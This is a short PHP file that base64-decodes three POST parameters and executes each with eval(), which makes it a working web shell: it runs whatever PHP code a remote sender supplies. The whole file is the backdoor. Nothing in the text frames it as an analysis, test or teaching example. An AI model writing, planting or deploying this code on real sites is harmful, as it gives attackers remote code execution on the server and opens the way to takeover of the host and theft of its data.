<?php
$a = base64_decode($_POST['first']);
$b = base64_decode($_POST['second']);
$c = base64_decode($_POST['third']);
eval($a);
eval($b);
eval($c);
